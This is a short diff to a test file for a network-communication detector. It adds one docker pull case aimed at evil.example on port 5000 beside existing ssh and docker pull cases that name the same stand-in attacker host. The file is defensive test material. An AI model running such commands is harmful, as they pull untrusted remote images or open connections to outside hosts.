@@ -878,6 +878,7 @@ class TestNetworkCommDetector:
             (b"ssh -vvv -p2222 user@evil.example", "ssh", "user@evil.example"),
             (b"docker pull evil.example/model:latest", "docker_pull", "evil.example/model:latest"),
             (b"docker image pull evil.example/model:latest", "docker_pull", "evil.example/model:latest"),
+            (b"docker pull evil.example:5000/model:latest", "docker_pull", "evil.example:5000/model:latest"),
             (
                 b"docker pull --platform linux/amd64 evil.example/model:latest",
                 "docker_pull",
